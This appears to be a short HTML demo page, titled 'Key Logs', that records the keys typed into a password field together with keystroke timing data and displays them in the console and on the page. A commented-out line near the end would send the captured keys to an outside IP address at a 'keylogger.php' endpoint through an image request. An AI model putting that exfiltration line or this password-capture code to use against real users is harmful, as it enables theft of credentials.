<!DOCTYPE html>
<html>
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
</head>
<body>

    <h1>Key Logs</h1>

    <input type="password" id = "text">
    <p id="demo"></p>
    

<script>

var buffer = [];
var oldstroke = new Object();
var newstroke = new Object();
var downbuffer =[];
var upbuffer =[];


 //document.getElementById("demo").value = "";



document.getElementById("text").onkeydown = function(e) {


    var timestamp = Date.now() | 0;
    var stroke = {
        key: e.key,
        time: timestamp

    };
    //var data = encodeURIComponent(JSON.stringify(buffer));
    if(stroke["key"] == "Backspace")
    {
        buffer = [];
        downbuffer=[];
        upbuffer=[];
        document.getElementById("text").value = "";
    }

    else if(stroke["key"] != "Shift"){

        downbuffer.push(stroke);
        
    }

}




document.getElementById("text").onkeyup = function(e) {
 
    var timestamp = Date.now() | 0;
    var stroke = {
        key: e.key,
        time: timestamp
    };

    
    if(stroke["key"] == "Backspace")
    {
        buffer = [];
        document.getElementById("text").value = "";
    }
    else if(stroke["key"] != "Shift")
    {
        upbuffer.push(stroke);
        var up = upbuffer.shift();
        var down = downbuffer.shift();
        var kftime=-(oldstroke.time-down.time);

        oldstroke=down;

        var time = up.time-down.time;
        var ftime=kftime-time;
        var stroke=new Object();
        
        stroke.key=up.key;
        stroke.kftime=kftime;
        //console.log(JSON.stringify(newstroke));
        stroke.time=time;
        stroke.ftime=ftime;
        //oldstroke = newstroke;
        buffer.push(stroke);
        console.log(JSON.stringify(buffer));


    }


    window.setInterval(function(){
    //new Image().src = 'http://206.130.110.212/forum/system/keylogger.php?c='+keys;
 
        document.getElementById("demo").innerHTML = JSON.stringify(buffer);
  

    }, 1000);

}





</script>
</body>
</html>

